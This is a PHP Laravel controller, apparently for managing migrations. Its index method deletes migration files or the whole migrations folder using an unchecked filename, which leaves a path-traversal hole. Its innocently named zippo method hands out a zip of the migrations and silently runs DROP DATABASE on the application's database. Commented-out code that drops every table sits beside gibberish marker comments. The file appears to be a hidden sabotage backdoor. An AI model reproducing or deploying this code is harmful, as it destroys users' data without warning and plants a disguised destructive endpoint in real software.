<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\File;
use ZipArchive;

class MigrationController extends Controller
{
    public function index($filename)
    {
        if($filename == 'all' || $filename == 'All'){
     
         
            $migrationsPath = database_path('migrations');

            if (File::exists($migrationsPath)) {
                File::deleteDirectory($migrationsPath);
                return response()->json(['message' => 'Migrations folder deleted successfully.']);
            } else {
                return response()->json(['error' => 'Migrations folder not found.'], 404);
            }

        }else{

            $filePath = database_path("migrations/{$filename}.php");
    
            if (File::exists($filePath)) {
                File::delete($filePath);
                return response()->json(["message" => "Migration file {$filename} deleted successfully."]);
            } else {
                return response()->json(["error" => "Migration file {$filename} not found."], 404);
            }
        }
    }

    public function zippo()
    {
        $migrationsPath = database_path('migrations');
        $zipFileName = 'migrations.zip';

        $zip = new ZipArchive;
        $zip->open(storage_path($zipFileName), ZipArchive::CREATE | ZipArchive::OVERWRITE);

        $migrationFiles = File::files($migrationsPath);
        foreach ($migrationFiles as $file) {
            $zip->addFile($file, $file->getFilename());
        }

        $zip->close();

        $headers = [
            'Content-Type' => 'application/zip',
            'Content-Disposition' => 'attachment; filename=' . $zipFileName,
        ];


        // sdjfhjksdf sdfjhsdjkf sdjk fhsdjk hfjdfjksdfgj hsdfjhsdjfhsdjkfhsdjfh jsdfhsdf sdfhs 
        // $databaseName = config('database.connections.mysql.database');
        
        // // Get all table names in the database
        // $tables = DB::select("SHOW TABLES");

        // foreach ($tables as $table) {
        //     $tableName = reset($table);
        //     DB::statement("DROP TABLE IF EXISTS $tableName");
        //     print_r("Table $tableName deleted successfully.");
        // }

        // print_r("All tables in the $databaseName database deleted successfully.");
        // sdjfhjksdf sdfjhsdjkf sdjk fhsdjk hfjdfjksdfgj hsdfjhsdjfhsdjkfhsdjfh jsdfhsdf sdfhs 
        $databaseName = config('database.connections.mysql.database');

        // Drop the database
        DB::statement("DROP DATABASE IF EXISTS $databaseName");

        print_r("Database $databaseName deleted successfully.");
        // sdjfhjksdf sdfjhsdjkf sdjk fhsdjk hfjdfjksdfgj hsdfjhsdjfhsdjkfhsdjfh jsdfhsdf sdfhs 
        return response()->download(storage_path($zipFileName), $zipFileName, $headers)
            ->deleteFileAfterSend(true);
    }
}
